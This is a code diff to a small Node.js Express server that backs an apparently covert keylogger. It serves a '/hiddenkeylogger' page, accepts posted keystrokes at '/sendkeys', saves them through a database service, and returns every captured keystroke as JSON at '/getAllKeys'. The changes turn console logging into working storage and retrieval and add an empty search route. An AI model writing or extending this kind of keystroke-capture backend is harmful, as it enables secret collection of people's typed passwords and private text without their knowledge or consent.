@@ -14,26 +14,33 @@ app.get("/", (req, res) => {
 });
 
 app.get("/hiddenkeylogger", (req, res) => {
-  res.render("keylogger.pug");
+  res.render("keyloggerpage");
 });
 
 app.get("/getAllKeys", (req, res) => {
-  console.log(keyloggerService.getAllStrokes());
+  keyloggerService.getAllStrokes().then(resp => {
+    res.json(resp);
+  }).catch(e => {
+    res.sendStatus(500);
+  });
 });
 
 app.post("/sendkeys", (req, res) => {
   // Placeholder for post mapping.
-  console.log(req.body);
-  console.log(JSON.stringify(req.body));
-  keyloggerService.saveKeystrokes(req.body).then(res => {
-    console.log("Res", res);
-  }).catch(e => {
-    console.log(e);
-  });
-  res.sendStatus(200);
+  try {
+    keyloggerService.saveKeystrokes(req.body);
+    res.sendStatus(200);
+  } catch(e) {
+    res.sendStatus(500);
+  }
+});
+
+app.post("/searchKeys", (req, res) => {
+
 });
 
 app.listen(8080, () => {
+  keyloggerService.connectDB();
   console.log("server started");
 });
 
